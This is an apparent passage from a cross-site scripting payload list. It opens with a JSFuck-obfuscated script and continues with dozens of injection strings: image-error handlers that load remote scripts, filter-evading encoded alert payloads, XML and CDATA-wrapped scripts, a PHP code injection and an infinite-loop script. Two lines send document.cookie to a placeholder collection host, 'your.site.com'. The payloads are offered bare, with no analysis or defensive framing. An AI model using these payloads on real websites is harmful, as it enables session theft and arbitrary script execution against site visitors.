]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
<img src=x onerror=with(document)body.appendChild(document.createElement('script')).src="domain.js"></img>
<img src=x onerror="with(document)body.appendChild(createElement('script')).src='domain.js'"></img>
<img src=1 onerror=jQuery.getScript("domain.js")> 
<img src="#" onerror="$.getScript('domain.js')">
<img src="#" onerror="var a=String.fromCharCode(47);$.getScript(a+a+'domain.sj'+a+'4091')">
<img src='0' onerror=with(document)body.appendChild(createElement('script')).src='domain.js'>
<img src="#" onload="s=document.createElement('script');s.src='domain.js'+Math.random();document.body.appendChild(s)" border="0">
<img src=i onerror=eval(jQuery.getScript('domain.js'))>
<img src=N onerror=eval(javascript:document.write(unescape(' <script src="domain.js"></script>'));)>
<img src=x onerror=document.body.appendChild(document.createElement('script')).src='domain.js'>
<img src=x onerror="with(document)body.appendChild(createElement('script')).src='domain.js'" width="0" height="0"></img>
<  script > < / script>
&lt
&lt;
&LT
&LT;
<
<<
<<<
"><script>"
<script>alert("XSS")</script>
<<script>alert("XSS");//<</script>
<script>alert(document.cookie)</script>
'><script>alert(document.cookie)</script>
'><script>alert(document.cookie);</script>
";alert('XSS');//
%3cscript%3ealert("XSS");%3c/script%3e
%3cscript%3ealert(document.cookie);%3c%2fscript%3e
%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
&ltscript&gtalert(document.cookie);</script>
&ltscript&gtalert(document.cookie);&ltscript&gtalert
<xss><script>alert('XSS')</script></vulnerable>
<IMG%20SRC='javascript:alert(document.cookie)'>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS')"
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG%20SRC='javasc	ript:alert(document.cookie)'>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'???.cookie</script>
%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
'';!--"<XSS>=&{()}
<name>','')); phpinfo(); exit;/*</name>
<![CDATA[<script>var n=0;while(true){n;}</script>]]>
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>

